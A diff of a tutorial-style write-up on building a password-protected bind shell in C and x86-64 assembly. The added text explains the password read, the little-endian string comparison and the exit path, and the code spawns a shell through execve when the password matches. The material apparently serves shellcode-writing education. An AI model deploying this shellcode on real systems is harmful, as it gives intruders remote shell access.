@@ -131,8 +131,7 @@ buf[strcspn(buf, "\n")] = 0;
 if (strcmp(arguments[4], buf) == 0)
 {        
       execve(arguments[0], &arguments[0], NULL);
-}
-       
+}     
 ```
 
 <h3>Stage 5 - Spawn the shell, if password is correct</h3>
@@ -253,24 +252,52 @@ syscall
 
 <h3>Stage 4 - Wait for input (password) to be received and compare it against the correct password string</h3>
 
+For this step, we will move our known password string, in reverse order, into a register and compare the string with whatever is passed back from the incoming connection. This operation is strictly 8 bytes and not the 16 bytes that we had in our C program (This is an area of improvement for future Assembly). If the two strings do not match, we jump to our 'exit' call and exit the program. Another important attribute of the 64-bit architecture is that it is little-endian, which basically means it will retrieve objects in reverse order. This effectively means that if we want to pass the string '8bytesss', then we need to pass it as 'sssetyb8' and in hex format. We can use python to retrieve our reverse order hex value for the 8 byte password we want to use:
+
+```python
+>>> password = '8bytesss'
+>>> len(password)
+8
+>>> password[::-1]
+'sssetyb8'
+>>> password[::-1].encode('hex')
+'7373736574796238'
+```
+
+```c
+read(sock, buf, 16);
+buf[strcspn(buf, "\n")] = 0;
+if (strcmp(arguments[4], buf) == 0)
+{        
+      execve(arguments[0], &arguments[0], NULL);
+} 
+```
+
 ```nasm
 
-        xor rax, rax
-
-        push r10
-        mov rsi, rsp
-        
-        xor rdx, rdx
-        mov rdx, 8
-        syscall
+        xor rax, rax ;zero out rax - read syscall number = 0
+        push r10 ;move 8 zero bytes to the stack for storing the password
+        mov rsi, rsp ;move the stack pointer to the 8 bytes into rsi for second argument 
+        xor rdx, rdx ;make sure rdx is zero
+        mov rdx, 8 ;move 8 into rdx for third argument - 8 in this case because our password only supports 8 bytes
+        syscall ;syscall read instruction
 
         xor rax, rax
         ; password '8bytesss'
-        mov rax, 0x7373736574796238
-        mov rdi, rsi
-        scasq
-        jne exit
+        mov rax, 0x7373736574796238 ;load password into rax in reverse order
+        mov rdi, rsi ;load the 8 bytes received from the client into rdi        
+        scasq ;scasq will compare rax with rdi
+        jne exit ;if the two strings contained within rax and rdi do not match, then jump to our exit syscall instruction
+        
+exit:
+        
+        xor rax, rax ;zero out rax in case of any remnant values before attempting to exit
+        mov rax, 60 ;syscall number for exit = 60
+        syscall ;syscall exit instruction
+```
 
+```nasm
+        
         xor rax, rax
         push rax
 
@@ -286,10 +313,6 @@ syscall
         push rdi
         mov rsi, rsp
         mov rax, 59
-        syscall
-
-        xor rax, rax
-        mov rax, 60
         syscall
 ```
 
